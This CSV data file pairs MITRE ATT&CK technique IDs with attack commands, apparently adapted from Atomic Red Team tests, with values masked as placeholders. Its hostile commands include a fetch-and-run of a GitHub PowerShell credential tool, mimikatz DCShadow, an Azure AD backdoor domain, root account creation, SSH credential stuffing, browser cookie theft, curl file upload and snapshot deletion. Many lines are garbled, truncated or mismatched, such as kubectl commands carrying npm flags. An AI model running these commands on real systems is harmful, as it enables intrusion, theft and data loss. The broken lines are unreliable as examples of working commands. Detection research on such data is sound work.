mitre_id,command
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_729"""
T1187,"iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\powersharppack\master\powersharpbinaries\invoke-internalmonologue.ps1')  invoke-internalmonologue  -command  ""-downgrade  true  -impersonate  true  -restore  true""# run_1770"
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_171"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd \c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('var_378"")"
T1485,"echo """" | ""var_246'`; do vim-cmd vmsvc\snapshot.removeall $i & done"""
T1046,"python ""#{filename}"" -i #{host_ip}"
T1546,"copy-item ""$pathtoatomicsfolder\t1546.011\bin\t1546.011compatdatabase.sdb"" c:\windows\apppatch\custom\t1546.011compatdatabase.sdb copy-item ""$pathtoatomicsfolder\t1546.011\bin\t1546.011compatdatabase.sdb"" c:\windows\apppatch\custom\custom64\t1546.011compatdatabase.sdb> /dev/null 2>&1 # id_33"
T1572,nohup var_313 >\dev\null 2>&1 &
T1207,"#  starting  fake  dc  server,  as  system  (required)  $dc_output_file  =  ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log""  remove-item  $dc_output_file  -erroraction  ignore  $mimikatzparam  =""`""log  $dc_output_file`""  `""lsadump::dcshadow  \object:var_238""  ""lsadump::dcshadow  \push""  ""exit""  write-host  ""`nwaiting  for  fake  dc  server  to  return""  wait-process  $dc  write-host  ""`noutput  from  fake  dc  server:""  get-content  $dc_output_file  start-sleep  1  #  wait  a  little  until  the  file  is  not  locked  anymore  so  we  can  actually  delete  it  remove-item  $dc_output_file  -erroraction  ignore  write-host  ""end  of  dcshadow"""
T1074,"compress-archive -path ""var_769 -force"
T1569,launchctl submit -l var_950
T1195,"kubectl run var_484 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1136,useradd -g 0 -m -d \root -s \bin\bash var_74831; fi;
T1098,"import-module msonline import-module azuread $password = convertto-securestring -string ""#{auth_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{auth_username}"", $password $targetsecurepw = convertto-securestring -string ""#{target_password}"" -asplaintext -force connect-msolservice -credential $credential -erroraction:silentlycontinue connect-azuread -credential $credential -erroraction:silentlycontinue #saving the objectid of the target_user into a variable $target_objid = get-azureaduser -filter ""userprincipalname eq '#{target_user}'"" | select-object -expandproperty objectid #reset the password of the target_user set-azureaduserpassword -objectid $target_objid -password $targetsecurepw -erroraction:silentlycontinue #adding target_user add-msolrolemember -rolename ""company administrator"" -rolememberemailaddress ""#{target_user}"" add-msolrolemember -rolename ""global reader"" -rolememberemailaddress ""#{target_user}"""
T1137,reg.exe add hkcu\software\microsoft\office\#{outlook_version}\outlook\webview\#{outlook_folder} /v url /t reg_sz /d #{url} /f# run_6396
T1614,"$info = @{ uilanguage = get-winuilanguageoverride userlanguages = (get-winuserlanguagelist).languagetag -join ', ' systemlocale = get-winsystemlocale currentculture = [system.globalization.cultureinfo]::currentculture.name currentuiculture = [system.globalization.cultureinfo]::currentuiculture.name timezone = (get-timezone).id } $info.getenumerator() | foreach-object { ""$($_.name): $($_.value)"" }"
T1614,locale# run_7201
T1204,"invoke-webrequest var_357"""
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_93857"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1548,sudo -l sudo cat \etc\sudoers sudo vim \etc\sudoers
T1114,"$secure_pwd = ""var_708"""
T1047,"wmic  \node:var_376"""
T1619,"for  bucket  in  ""$(aws  s3  ls  |  cut  -d  ""  ""  -f3)"";  do  aws  s3api  list-objects-v2  --bucket  $bucket  --output  text;  done# run_5586"
T1195,"kubectl run var_659 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1014,sudo modprobe var_367
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_899"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1195,"kubectl run var_558 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1007,launchctl  list> /dev/null 2>&1 # id_21
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""#{azure_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{azure_username}"", $pword try { connect-azuread -credential $credential -erroraction stop > $null } catch { write-host ""error: azuread could not connect"" exit 1 } try { $domain = get-azureaddomain -name ""#{domain_name}"" } catch { write-host ""error: domain """"#{domain_name}"""" not found"" exit 1 } if (-not $domain.isverified) { write-host ""error: domain """"#{domain_name}"""" not verified"" exit 1 } if ($domain.authenticationtype -eq ""federated"") { write-host ""error: domain """"#{domain_name}"""" already federated. try with a different domain or re-create it before."" exit 1 } $at = get-aadintaccesstokenforaadgraph -credentials $credential if (-not $at) { write-host ""error: aadinternals could not connect"" exit 1 } $new = convertto-aadintbackdoor -accesstoken $at -domainname ""#{domain_name}"" if ($new) { write-host ""federation successfully added to azure ad"" write-host $new } else { write-host ""the federation setup failed"" } write-host ""end of federation configuration.""# run_3552"
T1110,"cp ""$pathtoatomicsfolder/t1110.004/src/credstuffuserpass.txt"" /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'stricthostkeychecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done"
T1105,powershell.exe iwr -uri var_873
T1135,dir \\var_558\ipc$
T1078,"password=$(openssl passwd -1 art) ([ ""$(uname)"" = 'linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0)) su art -c ""whoami; exit""# run_1096"
T1613,docker build -t t1613 $pathtoatomicsfolder/t1613/src/ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)# run_7578
T1530,"$storage_account_objects = import-csv -path ""var_38552"
T1087,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli system account list"""
T1105,#{curl_path} -t #{file_path} #{remote_destination} #{curl_path} --upload-file #{file_path} #{remote_destination} #{curl_path} -d #{file_path} #{remote_destination} #{curl_path} --data #{file_path} #{remote_destination}
T1611,if [ ! -d var_56180 2>&1
T1033,set file=#{output_file_path}\user_info_%random%.tmp echo username: %username% > %file% echo user domain: %userdomain% >> %file% net users >> %file% query user >> %file%
T1059,"cscript ""#{vbscript}"" > $env:temp\t1059.005.out.txt"
T1571,test-netconnection  -computername  var_334
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd \c var_620"""
T1552,cat var_435
T1134,cmd \c 'var_76771'
T1571,test-netconnection -computername var_924
T1048,tar czpf - \users\* | openssl des3 -salt -pass var_515 'cat > \users.tar.gz.enc'
T1136,pw useradd var_92766 -s \usr\sbin\nologin -d \nonexistent -c evil_account
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""var_146"
T1057,wmic process get \format:list# run_2281
T1543,sudo cp var_54847
T1530,"$storage_account_objects = import-csv -path ""var_991"
T1610,docker  build  -t  t1610  $pathtoatomicsfolder\t1610\src\  docker  run  --name  t1610_container  --rm  -itd  t1610  bash  \tmp\script.sh> /dev/null 2>&1 # id_78
T1129,"var_154"""
T1001,"cd ""pathtoatomicsfolder\externalpayloads\"" import-module .\extract-invoke-psimage.ps1 $extractedscript=extract-invoke-psimage -image ""var_79060 $scriptpath = ""$home\textextraction.ps1"" $textmatches -join '' | set-content -path $scriptpath . ""$home\textextraction.ps1"""
T1027,"invoke-webrequest  -uri  var_187"""
T1047,"wmic \node:var_69092"""
T1529,shutdown -r var_2926
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""; echo 25 > $null"
T1202,# copy command to clipboard set-clipboard -value 'var_550')
